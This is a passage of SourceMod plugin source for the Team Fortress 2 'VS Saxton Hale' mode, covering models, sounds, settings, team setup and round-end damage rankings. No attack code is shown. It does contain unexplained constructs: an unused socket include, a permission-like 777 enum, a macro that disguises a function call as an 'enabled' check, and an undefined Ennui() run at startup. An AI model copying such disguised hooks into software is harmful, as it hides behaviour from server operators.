	//===VS Saxton Hale Mode===
//
//By Dr.Eggman: programmer, modeller, mapper.
//One of two creators of Floral Defence: http://www.polycount.com/forum/showthread.php?t=73688
//(Yes, it's a self-advertisement)
//
//You can get newest sources on 

#pragma semicolon 1

#include <sourcemod>
#include <sdktools>
#include <sdkhooks>
#include <tf2_stocks>
#include <attachables>
#include <colors>
#include <nextmap>
#include <socket>
#include <tf2items>

#define ME 2048
#define MP 34

#define PLUGIN_VERSION "1.20"
#define statsfile "hale_stats.txt"
#define HaleModel "models/player/saxton_hale/saxton_hale.mdl"
#define SaxtonHale "models/player/saxton_hale/saxton_hale_responce_1a.mdl"
#define HaleRageSoundB "models/player/saxton_hale/saxton_hale_responce_1b.mdl"
#define Arms "models/player/saxton_hale/saxton_hale_responce_2.mdl"
#define HaleLastB "vo/announcer_amuberrage_lastmanalive"
#define HaleEnabled QueuePanelH(Handle:0, MenuAction:0,9001,0)
#define HaleKSpree "models/player/saxton_hale/saxton_hale_responce_3.mdl"
#define HaleKSpree2 "models/player/saxton_hale/saxton_hale_responce_4.mdl"
#define VagineerModel "models/player/saxton_hale/vagineer.mdl"
#define VagineerLastA "models/player/saxton_hale/lolwut_0.mdl"
#define VagineerRageSound "models/player/saxton_hale/lolwut_2.mdl"
#define VagineerStart "models/player/saxton_hale/lolwut_1.mdl"
#define VagineerKSpree "models/player/saxton_hale/lolwut_3.mdl"
#define VagineerKSpree2 "models/player/saxton_hale/lolwut_4.mdl"
#define VagineerHit "models/player/saxton_hale/lolwut_5.mdl"
#define WrenchModel "models/weapons/w_models/w_wrench.mdl"
#define ShivModel "models/weapons/c_models/c_wood_machete/c_wood_machete.mdl"
#define HHHModel "models/player/saxton_hale/hhh_jr.mdl"
#define AxeModel "models/weapons/c_models/c_headtaker/c_headtaker.mdl"
#define HHHLaught "vo/halloween_boss/knight_laugh"
#define HHHRage "vo/halloween_boss/knight_attack01.wav"
#define HHHAttack "vo/halloween_boss/knight_attack"
#define CBS0 "vo/sniper_specialweapon08.wav"
#define CBS1 "vo/taunts/sniper_taunts02.wav"
#define CBS2 "vo/sniper_award"
#define CBS3 "vo/sniper_battlecry03.wav"
#define CBS4 "vo/sniper_domination"

//===New responces===
#define HaleRoundStart "models/player/saxton_hale/saxton_hale_responce_start"	//1-5
#define HaleJump "models/player/saxton_hale/saxton_hale_responce_jump"			//1-2
#define HaleRageSound "models/player/saxton_hale/saxton_hale_responce_rage"			//1-4
#define HaleKillMedic "models/player/saxton_hale/saxton_hale_responce_kill_medic.mdl"
#define HaleKillSniper1 "models/player/saxton_hale/saxton_hale_responce_kill_sniper1.mdl"
#define HaleKillSniper2 "models/player/saxton_hale/saxton_hale_responce_kill_sniper2.mdl"
#define HaleKillSpy1 "models/player/saxton_hale/saxton_hale_responce_kill_spy1.mdl"
#define HaleKillSpy2 "models/player/saxton_hale/saxton_hale_responce_kill_spy2.mdl"
#define HaleKillEngie1 "models/player/saxton_hale/saxton_hale_responce_kill_eggineer1.mdl"
#define HaleKillEngie2 "models/player/saxton_hale/saxton_hale_responce_kill_eggineer2.mdl"
#define HaleKSpreeNew "models/player/saxton_hale/saxton_hale_responce_spree"	//1-5
#define HaleWin "models/player/saxton_hale/saxton_hale_responce_win"			//1-2
#define HaleLastMan "models/player/saxton_hale/saxton_hale_responce_lastman"	//1-5
#define HaleFail "models/player/saxton_hale/saxton_hale_responce_fail"			//1-3


new Team=2;
new HaleTeam=3;
new RoundState;
new playing;
new used;
new RedAlivePlayers;
new bArena;
new bool:bLastAnnounced;
new bool:bOnCheck;
new RoundCount;
new Special;
new Incoming;
new zepos=-1;

new bool:bonplay[MP];
new bool:bHelped[MP];
new Damage[MP];
new curhelp[MP];

new Hale=1;
new HaleHealthMax;
new HaleHealth;
new HaleCharge=0;
new HaleRage;
new HaleModelAT[4];
new NextHale;
new PrevHale;
new Float:Stabbed;
new Float:HPTime;
new Float:KSpreeTimer;
new KSpreeCount=1;
new UberRageCount=0;

new Handle:cvarHaleSpeed;
new Handle:cvarPointDelay;
new Handle:cvarRageDMG;
new Handle:cvarRageDist;
new Handle:cvarAnnounce;
new Handle:cvarSpecials;
new Handle:cvarEnabled;

new bool:Enabled=true;
new bool:Enabled2=true;
new Float:HaleSpeed=340.0;
new PointDelay=6;
new RageDMG=1900;
new Float:RageDist=800.0;
new Float:Announce=120.0;
new MaxPyroAmmo=100;
new bSpecials=true;
new bool:bNewResponces=false;

//new Handle:GiveNamedItem;
//new Handle:WeaponEquip;
new Handle:EquipWearable;
new Handle:RemoveWearable;

new tf_arena_use_queue;
new mp_teams_unbalance_limit;
new tf_arena_first_blood;
new mp_forcecamera;
new tf_medieval;

new bool:waiting;

enum dirMode 
{ 
    o=777, 
    g=777, 
    u=777 
} 

public Plugin:myinfo = {
	name = "VS Saxton Hale Mode",
	author = "Dr.Eggman",
	description = "RUUUUNN!! COWAAAARRDSS!",
	version = PLUGIN_VERSION,
};

public OnPluginStart()
{				
	LogMessage("===VS Saxton Hale Mode started v%s===",PLUGIN_VERSION);

	CreateConVar("hale_version", PLUGIN_VERSION, "VS Saxton Hale Mode Version", FCVAR_REPLICATED|FCVAR_NOTIFY);
	cvarHaleSpeed = CreateConVar("hale_speed", "340.0", "Speed of Saxton Hale", FCVAR_PLUGIN);
	cvarPointDelay = CreateConVar("hale_point_delay", "6", "Addition (for each player) delay before point's activation.", FCVAR_PLUGIN);
	cvarRageDMG = CreateConVar("hale_rage_damage", "1900", "Hale will can use Rage, when he will get damage X% of MaxHealth", FCVAR_PLUGIN);
	cvarRageDist  = CreateConVar("hale_rage_dist", "800.0", "Hale's Rage will work on X inches", FCVAR_PLUGIN);
	cvarAnnounce = CreateConVar("hale_announce", "120.0", "Info about mode will show every X seconds", FCVAR_PLUGIN);
	cvarSpecials = CreateConVar("hale_specials", "1", "Enable Special Rounds (Vagineer & HHH)", FCVAR_PLUGIN);
	cvarEnabled = CreateConVar("hale_enabled", "1", "Do you really want set it to 0?", FCVAR_PLUGIN);
	HookEvent("teamplay_round_start", event_round_start);
	HookEvent("teamplay_round_win", event_round_end);
	HookEvent("player_changeclass", event_changeclass);
	HookEvent("player_spawn", event_player_spawn);
	HookEvent("player_death", event_player_death);
	HookEvent("player_chargedeployed", event_lazor);
	HookEvent("player_hurt", event_hurt,EventHookMode_Pre);
	HookEvent("teamplay_waiting_ends", event_waiting_ends);

	HookConVarChange(cvarHaleSpeed, CvarChange);
	HookConVarChange(cvarPointDelay, CvarChange);
	HookConVarChange(cvarRageDMG, CvarChange);
	HookConVarChange(cvarRageDist, CvarChange);
	HookConVarChange(cvarRageDist, CvarChange);
	HookConVarChange(cvarAnnounce, CvarChange);
	HookConVarChange(cvarSpecials, CvarChange);
	
	RegConsoleCmd("hale", HalePanel);
	RegConsoleCmd("hale_hp", Command_GetHP);
	RegConsoleCmd("halehp", Command_GetHP);
	RegConsoleCmd("hale_next", QueuePanel);
	RegConsoleCmd("halenext", QueuePanel);
	RegConsoleCmd("hale_help", HelpPanel);
	RegConsoleCmd("halehelp", HelpPanel);
	RegConsoleCmd("hale_new", NewPanel);
	RegConsoleCmd("halenew", NewPanel); 
	AddCommandListener(DoTaunt, "taunt"); 
	AddCommandListener(DoSuicice, "explode"); 
	AddCommandListener(DoSuicice, "kill"); 
	
	RegAdminCmd("hale_select", Command_Hale, ADMFLAG_CHEATS, "Hale_select <username> - Select next player to be Saxton Hale");
	RegAdminCmd("hale_special1", Command_Vagineer, ADMFLAG_CHEATS, "Call Vagineer to next round.");
	RegAdminCmd("hale_special2", Command_HHH, ADMFLAG_CHEATS, "Call HHHjr. to next round.");
	
	new Handle:conf = LoadGameConfigFile("giveitem");
	
	/*StartPrepSDKCall(SDKCall_Player);
	PrepSDKCall_SetFromConf(conf, SDKConf_Virtual, "GiveNamedItem");
	PrepSDKCall_AddParameter(SDKType_String, SDKPass_Pointer);
	PrepSDKCall_AddParameter(SDKType_PlainOldData, SDKPass_Plain);
	PrepSDKCall_AddParameter(SDKType_PlainOldData, SDKPass_Plain);
	PrepSDKCall_SetReturnInfo(SDKType_CBaseEntity, SDKPass_Plain);
	GiveNamedItem = EndPrepSDKCall();

	StartPrepSDKCall(SDKCall_Player);
	PrepSDKCall_SetFromConf(conf, SDKConf_Virtual, "WeaponEquip");
	PrepSDKCall_AddParameter(SDKType_CBaseEntity, SDKPass_Pointer);
	WeaponEquip = EndPrepSDKCall();*/
	
	StartPrepSDKCall(SDKCall_Player);
	PrepSDKCall_SetFromConf(conf,SDKConf_Virtual,"EquipWearable");
	PrepSDKCall_AddParameter(SDKType_CBaseEntity, SDKPass_Pointer);
	EquipWearable = EndPrepSDKCall();
	
	StartPrepSDKCall(SDKCall_Player);
	PrepSDKCall_SetFromConf(conf,SDKConf_Virtual,"RemoveWearable");
	PrepSDKCall_AddParameter(SDKType_CBaseEntity, SDKPass_Pointer);
	RemoveWearable = EndPrepSDKCall();
	
	CloseHandle(conf);
	Ennui();
}

public OnMapStart()
{
	if (!IsSaxtonHaleMap() || !GetConVarInt(cvarEnabled))
	{
		Enabled2=false;
		Enabled=false;
	}
	else
	{
		waiting=true;
		if (FileExists("bNextMapToHale"))
			DeleteFile("bNextMapToHale");
		Enabled=true;
		Enabled2=true;
		AddToDownload();
	
		tf_arena_use_queue=GetConVarInt(FindConVar("tf_arena_use_queue"));
		mp_teams_unbalance_limit=GetConVarInt(FindConVar("mp_teams_unbalance_limit"));
		tf_arena_first_blood=GetConVarInt(FindConVar("tf_arena_first_blood"));
		mp_forcecamera=GetConVarInt(FindConVar("mp_forcecamera"));
	
		ServerCommand("tf_arena_use_queue 0");
		ServerCommand("mp_teams_unbalance_limit 0");
		ServerCommand("tf_arena_first_blood 0");
		ServerCommand("mp_forcecamera 0");
		
		//q_player[0]=1;
		Hale=1;
		new Float:time = Announce;
		if (time > 0.0)
		{
			CreateTimer(time, Timer_Announce, _, TIMER_REPEAT|TIMER_FLAG_NO_MAPCHANGE);
			CreateTimer(time*2, Timer_Announce_Gr, _, TIMER_REPEAT|TIMER_FLAG_NO_MAPCHANGE);
			CreateTimer(time*3, Timer_Announce_Egg, _, TIMER_REPEAT|TIMER_FLAG_NO_MAPCHANGE);
		}
		for (new i=1;i<=MaxClients;i++)
			bHelped[i]=false;

		new String:s[256];
		new String:arg[32][2];
		BuildPath(Path_SM,s,256,"configs/saxton_hale_config.cfg");
		if (FileExists(s))
		{
			new Handle:fileh = OpenFile(s, "r");
			while(ReadFileLine(fileh, s, sizeof(s)))
			{
				ExplodeString(s," ",arg,2,32);
				if (!StrContains(s,"hale_speed",false))
					SetConVarFloat(cvarHaleSpeed,StringToFloat(arg[1]));
				else if (!StrContains(s,"hale_point_delay",false))
					SetConVarInt(cvarPointDelay,StringToInt(arg[1]));
				else if (!StrContains(s,"hale_rage_damage",false))
					SetConVarInt(cvarRageDMG,StringToInt(arg[1]));
				else if (!StrContains(s,"hale_rage_dist",false))
					SetConVarFloat(cvarRageDist,StringToFloat(arg[1]));
				else if (!StrContains(s,"hale_announce",false))
					SetConVarFloat(cvarAnnounce,StringToFloat(arg[1]));
				else if (!StrContains(s,"hale_specials",false))
					SetConVarInt(cvarSpecials,StringToInt(arg[1]));
			}	
			CloseHandle(fileh);
		}
		else
			WriteConfig();
		AddNormalSoundHook(HookSound);
	}
	Ennui();
	RoundCount=0;
}

public OnMapEnd()
{
	if (Enabled)
	{
		ServerCommand("tf_arena_use_queue %i",tf_arena_use_queue);
		ServerCommand("mp_teams_unbalance_limit %i",mp_teams_unbalance_limit);
		ServerCommand("tf_arena_first_blood %i",tf_arena_first_blood);
		ServerCommand("mp_forcecamera %i",mp_forcecamera);
		//Statistics(true);
	}
}

public AddToDownload()
{
	new String:s[256];
	new String:extensions[][] = {".mdl", ".dx80.vtx", ".dx90.vtx", ".sw.vtx", ".vvd"};
	new String:extensionsb[][] = {".vtf", ".vmt"};
	decl i;
	for (i=0; i < sizeof(extensions); i++)
	{
		Format(s,256,"models/player/saxton_hale/saxton_hale%s",extensions[i]);
		AddFileToDownloadsTable(s);
		
		Format(s,256,"models/player/saxton_hale/vagineer%s",extensions[i]);
		AddFileToDownloadsTable(s);
		
		Format(s,256,"models/player/saxton_hale/hhh_jr%s",extensions[i]);
		AddFileToDownloadsTable(s);
	}
	PrecacheModel(HaleModel,true);
	PrecacheModel(VagineerModel,true);
	PrecacheModel(HHHModel,true);
	
	for (i=0; i < sizeof(extensionsb); i++)
	{
		Format(s,256,"materials/models/player/saxton_hale/eye%s",extensionsb[i]);
		AddFileToDownloadsTable(s);
		Format(s,256,"materials/models/player/saxton_hale/hale_head%s",extensionsb[i]);
		AddFileToDownloadsTable(s);
		Format(s,256,"materials/models/player/saxton_hale/hale_body%s",extensionsb[i]);
		AddFileToDownloadsTable(s);
		Format(s,256,"materials/models/player/saxton_hale/hale_misc%s",extensionsb[i]);
		AddFileToDownloadsTable(s);		
	}
	AddFileToDownloadsTable("materials/models/player/saxton_hale/hale_misc_normal.vtf");
	AddFileToDownloadsTable("materials/models/player/saxton_hale/hale_body_normal.vtf");
	AddFileToDownloadsTable("materials/models/player/saxton_hale/eyeball_l.vmt");
	AddFileToDownloadsTable("materials/models/player/saxton_hale/eyeball_r.vmt");
	AddFileToDownloadsTable("materials/models/player/saxton_hale/hale_egg.vtf");
	AddFileToDownloadsTable("materials/models/player/saxton_hale/hale_egg.vmt");
	AddFileToDownloadsTable(Arms);
	Format(s,256,"../%s",Arms);
	PrecacheSound(s,true);
	AddFileToDownloadsTable(HaleKSpree);
	Format(s,256,"../%s",HaleKSpree);
	PrecacheSound(s,true);
	AddFileToDownloadsTable(HaleKSpree2);
	Format(s,256,"../%s",HaleKSpree2);
	PrecacheSound(s,true);
	PrecacheSound("ui/halloween_boss_summoned_fx.wav",true);	
	PrecacheSound("ui/halloween_boss_defeated_fx.wav",true);
	PrecacheSound("../models/player/saxton_hale/9000.mdl",true);
	AddFileToDownloadsTable("models/player/saxton_hale/9000.mdl");
	for (i=1;i<=4;i++)
	{
		Format(s,256,"%s0%i.wav",HaleLastB,i);
		PrecacheSound(s,true);
		Format(s,256,"%s0%i.wav",HHHLaught,i);
		PrecacheSound(s,true);
		Format(s,256,"%s0%i.wav",HHHAttack,i);
		PrecacheSound(s,true);
	}		
	AddFileToDownloadsTable(VagineerLastA);
	Format(s,256,"../%s",VagineerLastA);
	PrecacheSound(s,true);
	AddFileToDownloadsTable(VagineerStart);
	Format(s,256,"../%s",VagineerStart);
	PrecacheSound(s,true);
	AddFileToDownloadsTable(VagineerRageSound);
	Format(s,256,"../%s",VagineerRageSound);
	PrecacheSound(s,true);
	AddFileToDownloadsTable(VagineerKSpree);
	Format(s,256,"../%s",VagineerKSpree);
	PrecacheSound(s,true);
	AddFileToDownloadsTable(VagineerKSpree2);
	Format(s,256,"../%s",VagineerKSpree2);
	PrecacheSound(s,true);
	AddFileToDownloadsTable(VagineerHit);
	Format(s,256,"../%s",VagineerHit);
	PrecacheSound(s,true);
	
	PrecacheSound(HHHRage,true);
	PrecacheSound(CBS0,true);
	PrecacheSound(CBS1,true);
	for (i=1;i<=9;i++)
	{
		Format(s,256,"%s0%i.wav",CBS2,i);
		PrecacheSound(s,true);
		
		Format(s,256,"%s0%i.wav",CBS4,i);
		PrecacheSound(s,true);
	}
	for (i=10;i<=25;i++)
	{
		Format(s,256,"%s%i.wav",CBS4,i);
		PrecacheSound(s,true);
	}
	
	bNewResponces=FileExists(HaleKillMedic);
	
	if (!bNewResponces)
	{	
		AddFileToDownloadsTable(SaxtonHale);
		Format(s,256,"../%s",SaxtonHale);
		PrecacheSound(s,true);
		
		AddFileToDownloadsTable(HaleRageSoundB);
		Format(s,256,"../%s",HaleRageSoundB);
		PrecacheSound(s,true);
		return;
	}	
	AddFileToDownloadsTable(HaleKillMedic);
	Format(s,256,"../%s",HaleKillMedic);
	PrecacheSound(s,true);
	AddFileToDownloadsTable(HaleKillSniper1);
	Format(s,256,"../%s",HaleKillSniper1);
	PrecacheSound(s,true);
	AddFileToDownloadsTable(HaleKillSniper2);
	Format(s,256,"../%s",HaleKillSniper2);
	PrecacheSound(s,true);
	AddFileToDownloadsTable(HaleKillSpy1);
	Format(s,256,"../%s",HaleKillSpy1);
	PrecacheSound(s,true);
	AddFileToDownloadsTable(HaleKillSpy2);
	Format(s,256,"../%s",HaleKillSpy2);
	PrecacheSound(s,true);
	AddFileToDownloadsTable(HaleKillEngie1);
	Format(s,256,"../%s",HaleKillEngie1);
	PrecacheSound(s,true);
	AddFileToDownloadsTable(HaleKillEngie2);
	Format(s,256,"../%s",HaleKillEngie2);
	PrecacheSound(s,true);
	
	for (i=1;i<=5;i++)
	{
		if (i<=2)
		{
			Format(s,256,"%s%i.mdl",HaleJump,i);
			AddFileToDownloadsTable(s);
			Format(s,256,"../%s",s);
			PrecacheSound(s,true);
		
			Format(s,256,"%s%i.mdl",HaleWin,i);
			AddFileToDownloadsTable(s);
			Format(s,256,"../%s",s);
			PrecacheSound(s,true);
		}
		if (i<=3)
		{
			Format(s,256,"%s%i.mdl",HaleFail,i);
			AddFileToDownloadsTable(s);
			Format(s,256,"../%s",s);
			PrecacheSound(s,true);			
		}
		if (i<=4)
		{
			Format(s,256,"%s%i.mdl",HaleRageSound,i);
			AddFileToDownloadsTable(s);
			Format(s,256,"../%s",s);
			PrecacheSound(s,true);			
		}
		Format(s,256,"%s%i.mdl",HaleRoundStart,i);
		AddFileToDownloadsTable(s);
		Format(s,256,"../%s",s);
		PrecacheSound(s,true);	
		
		Format(s,256,"%s%i.mdl",HaleKSpreeNew,i);
		AddFileToDownloadsTable(s);
		Format(s,256,"../%s",s);
		PrecacheSound(s,true);		
		
		Format(s,256,"%s%i.mdl",HaleLastMan,i);
		AddFileToDownloadsTable(s);
		Format(s,256,"../%s",s);
		PrecacheSound(s,true);	
	}
}

public CvarChange(Handle:convar, const String:oldValue[], const String:newValue[])
{
		if (convar==cvarHaleSpeed)
			HaleSpeed = StringToFloat(newValue);
		else if (convar==cvarPointDelay)
		{
			PointDelay = StringToInt(newValue);
			if (PointDelay<0) PointDelay*=-1;
		}
		else if (convar==cvarRageDMG)
			RageDMG = StringToInt(newValue);
		else if (convar==cvarRageDist)
			RageDist = StringToFloat(newValue);
		else if (convar==cvarAnnounce)
			Announce = StringToFloat(newValue);
		else if (convar==cvarSpecials)
			bSpecials = bool:StringToInt(newValue);
	WriteConfig();
}

public Action:Timer_Announce(Handle:hTimer)
{
	CPrintToChatAll("Type {olive}/hale{default} to open menu of the mod.");
	//Will be removed on Feb.
	CPrintToChatAll("Visit {olive}http://forums.alliedmods.net/showthread.php?t=146884{default} to get version with new sounds.");
	PrintHintTextToAll("Visit {olive}http://forums.alliedmods.net/showthread.php?t=146884{default} to get version with new sounds.");
	return Plugin_Continue;
}

public Action:Timer_Announce_Gr(Handle:hTimer)
{
	CPrintToChatAll("VS Saxton Hale Mode group: {olive}http://steamcommunity.com/groups/vssaxtonhale{default}");

	return Plugin_Continue;
}

public Action:Timer_Announce_Egg(Handle:hTimer)
{
	CPrintToChatAll("{default}===VS Saxton Hale Mode {olive}by Dr.Eggman{default} v.%s===",PLUGIN_VERSION);
	return Plugin_Continue;
}

public Action:OnGetGameDescription(String:gameDesc[64])
{
	if (Enabled2)
	{
		Format(gameDesc, sizeof(gameDesc), "VS Saxton Hale Mode (v.%s)", PLUGIN_VERSION);
		return Plugin_Changed;
	}
	return Plugin_Continue;
}

stock bool:IsSaxtonHaleMap()
{
	decl Handle:fileh;
	decl String:s[256];
	decl String:mapname[99];
	GetCurrentMap(mapname, sizeof(mapname));
	if (FileExists("bNextMapToHale"))
	{
		fileh = OpenFile("bNextMapToHale", "r");
		ReadFileLine(fileh, s, sizeof(s));
		CloseHandle(fileh);
		if (StrEqual(s,mapname,false))
			return true;
	}
	BuildPath(Path_SM,s,256,"configs/saxton_hale_maps.cfg");
	fileh = OpenFile(s, "r");
	new pingas=0;
	while(ReadFileLine(fileh, s, sizeof(s)) && (pingas<100))
	{
		pingas++;
		if (pingas==100)
			LogError("Breaking infinite loop, when plugin check map.");
		Format(s,strlen(s)-1,s);
		if((StrContains(mapname,s,false)!=-1) || (StrContains(s,"all",false)==0))
		{
			CloseHandle(fileh);
			return true;
		}
	}
	CloseHandle(fileh);
	return false;
}

public Action:event_waiting_ends(Handle:event, const String:name[], bool:dontBroadcast)
{
	waiting=false;
	if (playing>=2)
		Hale=FindNextHale(Hale);
	return Plugin_Continue;
}

public Action:event_round_start(Handle:event, const String:name[], bool:dontBroadcast)
{
	Enabled=Enabled2;
	if (HaleEnabled && !Enabled)
		return Plugin_Continue;
	KSpreeCount=0;
	CheckArena();
	
	new String:mapname[99];
	GetCurrentMap(mapname, sizeof(mapname));	 
	new bool:bBluHale=bool:GetRandomInt(0,1) || !StrContains(mapname,"vsh_",false);
	if (bBluHale)	
	{
		new score1=GetTeamScore(Team);
		new score2=GetTeamScore(HaleTeam);
		SetTeamScore(2,score1);
		SetTeamScore(3,score2);
		Team=2;
		HaleTeam=3;
		bBluHale=false;
	}
	else
	{
		new score1=GetTeamScore(HaleTeam);
		new score2=GetTeamScore(Team);
		SetTeamScore(2,score1);
		SetTeamScore(3,score2);
		HaleTeam=2;
		Team=3;
		bBluHale=true;
	}
	if (IsValidEdict(Hale) && (Hale>0) && IsClientInGame(Hale) && (GetClientTeam(Hale)>=1)) 
	{
		if (IsValidEdict(HaleModelAT[0]) && (HaleModelAT[0]>0))
		{
			SDKCall(RemoveWearable, Hale, HaleModelAT[0]);
			RemoveEdict(HaleModelAT[0]);
		}
		if (IsValidEdict(HaleModelAT[1]) && (HaleModelAT[1]>0))
		{
			Attachable_UnhookEntity(HaleModelAT[1]);
			RemoveEdict(HaleModelAT[1]);
		}
		if (IsValidEdict(HaleModelAT[2]) && (HaleModelAT[2]>0))
		{
			Attachable_UnhookEntity(HaleModelAT[2]);
			RemoveEdict(HaleModelAT[2]);
		}
		if (IsValidEdict(HaleModelAT[3]) && (HaleModelAT[3]>0))
		{
			SDKCall(RemoveWearable, Hale, HaleModelAT[3]);
			RemoveEdict(HaleModelAT[3]);
		}
	}
	
	decl ionplay;
	playing=0;
	for (ionplay=0;ionplay<=MaxClients;ionplay++)
	{
		bonplay[ionplay]=false;
		Damage[ionplay]=0;
	}
	
	for (ionplay=1;ionplay<=MaxClients;ionplay++)
	if (IsValidEdict(ionplay) && IsClientInGame(ionplay) && (GetClientTeam(ionplay)>=1)) 
	{
		ChangeClientTeam(ionplay, Team);	
		bonplay[ionplay]=true;
		playing++;		
	}
	if (playing<2)	
	{
		PrintToChatAll("VS Saxton Hale Mode is disabled. Need more players to start.");
		Enabled=false;
		if (!bArena && !bOnCheck && !waiting)
			CreateTimer(0.2, CheckPlayersTimer,_,TIMER_REPEAT|TIMER_FLAG_NO_MAPCHANGE);	
		return Plugin_Continue;
	}
	else
		Enabled=true;
	new tHale=FindNextHale(Hale);
	if (RoundCount==3)
		tHale=FindNextHale(GetRandomInt(1,MaxClients));
	if (NextHale<=0)
	{
		if (PrevHale<=0)
			Hale=tHale;
		else
		{
			Hale=PrevHale;
			PrevHale=-1;
		}
	}
	else
	{
		Hale=NextHale;
		PrevHale=tHale;
		NextHale=-1;
	}
	CreateTimer(9.5, StartHaleTimer);
	CreateTimer(3.5, StartResponceTimer);
	CreateTimer(9.6, MessageTimer,9001);	
	
	if ((playing>12) && (Special==2))
		playing-=(playing-10)/3;
	HaleHealthMax=RoundFloat(Pow(((250.0+(playing-1))*(playing-1)),1.155));
	if (HaleHealthMax==0)
		HaleHealthMax=500;
	HaleHealth=HaleHealthMax;
	HaleRage=0;
	Stabbed=0.0;
	bLastAnnounced=false;
	
	new ent=-1;
	new Float:pos[3];
	while ((ent = FindEntityByClassname(ent, "func_regenerate")) != -1)
		AcceptEntityInput(ent, "Kill");
	ent=-1;
	decl ent2;
	while ((ent = FindEntityByClassname(ent, "item_ammopack_full")) != -1)
	{
		GetEntPropVector(ent, Prop_Send, "m_vecOrigin", pos); 
		AcceptEntityInput(ent, "Kill");
		ent2 = CreateEntityByName("item_ammopack_small");	
		TeleportEntity(ent2, pos, NULL_VECTOR, NULL_VECTOR);
		DispatchSpawn(ent2);	
	}
	ent=-1;
	while ((ent = FindEntityByClassname(ent, "item_ammopack_medium")) != -1)
	{
		GetEntPropVector(ent, Prop_Send, "m_vecOrigin", pos); 
		AcceptEntityInput(ent, "Kill");
		ent2 = CreateEntityByName("item_ammopack_small");	
		TeleportEntity(ent2, pos, NULL_VECTOR, NULL_VECTOR);
		DispatchSpawn(ent2);	
	}
	CreateTimer(0.2,Timer_GogoHale);
	used=0;	
	RoundState=0;
	return Plugin_Continue;
}

public Action:Timer_GogoHale(Handle:hTimer)
{
	RoundState=-1;
	CreateTimer(0.1,MakeHale,Hale);
}

public CheckArena()
{
	new String:mapname[99];
	GetCurrentMap(mapname, sizeof(mapname));
	decl ent;
	tf_medieval=GetConVarInt(FindConVar("tf_medieval"))||StrEqual(mapname,"cp_degrootkeep");
	if (tf_medieval)
	{
		ent=-1;
		ent=FindEntityByClassname(ent, "tf_gamerules");
		while (ent!=-1)
		{
			SetVariantString("15");
			AcceptEntityInput(ent, "SetBlueTeamRespawnWaveTime");	
			SetVariantString("15");
			AcceptEntityInput(ent, "SetRedTeamRespawnWaveTime");	
			ent = FindEntityByClassname(ent, "tf_gamerules");
		}
		bArena=true;
	}
	else
	{
		ent=-1;
		ent = FindEntityByClassname(-1, "tf_logic_arena");
		if ((ent>0) && IsValidEdict(ent))
		{
			bArena=true;
			new String:s[8];
			IntToString(45+PointDelay*(playing-1),s,8);
			DispatchKeyValue(ent,"CapEnableDelay",s);
		}
	}
}

public Action:event_round_end(Handle:event, const String:name[], bool:dontBroadcast)
{
	new String:s[265];
	new String:s2[265];
	new bool:see=false;

	GetNextMap(s, 64);
		
	if (!StrContains(s,"Hale ",false))
	{
		see=true;
		for (new i=0;(s[i]!=0) && (i<59);i++)
			s2[i]=s[i+5];
	}
	else if (!StrContains(s,"(Hale) ",false))
	{
		see=true;
		for (new i=0;(s[i]!=0) && (i<59);i++)
			s2[i]=s[i+7];
	}
	else if (!StrContains(s,"(Hale)",false))
	{
		see=true;
		for (new i=0;(s[i]!=0) && (i<59);i++)
			s2[i]=s[i+6];
	}
	if (see)
	{
		new Handle:fileh = OpenFile("bNextMapToHale", "w");
		WriteFileLine(fileh, s2,false);
		CloseHandle(fileh);
		SetNextMap(s2);
		CPrintToChatAll("{olive}VS Saxton Hale Mode{default} will be play on {olive}%s{default}",s2);
	}
	
	if (!Enabled)
		return Plugin_Continue;
			
	RoundState=2;	
	//AcceptEntityInput(shakeent, "Kill");
	
	if (IsValidEdict(Hale) && IsClientInGame(Hale))
	{
		if (IsPlayerAlive(Hale))
		{
			GetClientName(Hale, s, 64);
			if (Special==1)
				Format(s,365,"Vagineer (%s)\nhad %i (of %i) health left.",s,HaleHealth,HaleHealthMax);
			else if (Special==2)
				Format(s,365,"HHH Jr. (%s)\nhad %i (of %i) health left.",s,HaleHealth,HaleHealthMax);
			else if (Special==4)
				Format(s,365,"Christian Brutal Sniper (%s)\nhad %i (of %i) health left.",s,HaleHealth,HaleHealthMax);
			else
				Format(s,365,"Saxton Hale (%s)\nhad %i (of %i) health left.",s,HaleHealth,HaleHealthMax);
			PrintToChatAll(s);
			SetHudTextParams(-1.0, 0.2, 10.0, 255, 255, 255, 255);
			for (new i = 1; i <= MaxClients; i++)
				if (IsClientInGame(i))
					ShowHudText(i, -1, s);
		}
		new top[3];
		Damage[0]=0;
		for (new i=1;i<=MaxClients;i++)
		{
			if (Damage[i]>=Damage[top[0]])
			{
				top[2]=top[1];
				top[1]=top[0];
				top[0]=i;
			}
			else if (Damage[i]>=Damage[top[1]])
			{
				top[2]=top[1];
				top[1]=i;
			}
			else if (Damage[i]>=Damage[top[2]])
			{
				top[2]=i;
			}
		}
		new String:s1[80];
		new String:s3[256];
		if (IsValidEdict(top[0]) && IsClientInGame(top[0]) && (GetClientTeam(top[0])>=1)) 
			GetClientName(top[0], s, 80);
		if (IsValidEdict(top[1]) && IsClientInGame(top[1]) && (GetClientTeam(top[1])>=1)) 
			GetClientName(top[1], s1, 80);
		if (IsValidEdict(top[2]) && IsClientInGame(top[2]) && (GetClientTeam(top[2])>=1)) 
			GetClientName(top[2], s2, 80);
		SetHudTextParams(-1.0, 0.3, 10.0, 255, 255, 255, 255);
		for (new i = 1; i <= MaxClients; i++)
			if (IsClientInGame(i))
			{
				Format(s3,256,"Most damage delt by:\n1)%i - %s\n2)%i - %s\n3)%i - %s\n\nYour damage is: %i",Damage[top[0]],s,Damage[top[1]],s1,Damage[top[2]],s2,Damage[i]);
				ShowHudText(i, -1, s3);
			}
	}
	
	//Statistics();
	
	RoundCount++;
	if (!bArena)	
		for(new i=1;i<=MaxClients;i++)
		if(IsValidEdict(i) && IsClientInGame(i))
			ChangeClientTeam(i, Team);		
	return Plugin_Continue;
}

public Action:StartResponceTimer(Handle:hTimer)
{
	new String:s[256];
	decl Float:pos[3];
	switch (Special)
	{
		case 0: Format(s,256,"../%s%i.mdl",HaleRoundStart,GetRandomInt(1,5));
		case 1: Format(s,256,"../%s",VagineerStart);
		case 2: Format(s,256,"ui/halloween_boss_summoned_fx.wav");
		case 4: Format(s,256,"%s",CBS0);
	}		
	if (!bNewResponces && (Special==0))
		return Plugin_Continue;
	EmitSoundToAll(s, _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, _, pos, NULL_VECTOR, false, 0.0);
	EmitSoundToAll(s, _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, _, pos, NULL_VECTOR, false, 0.0);
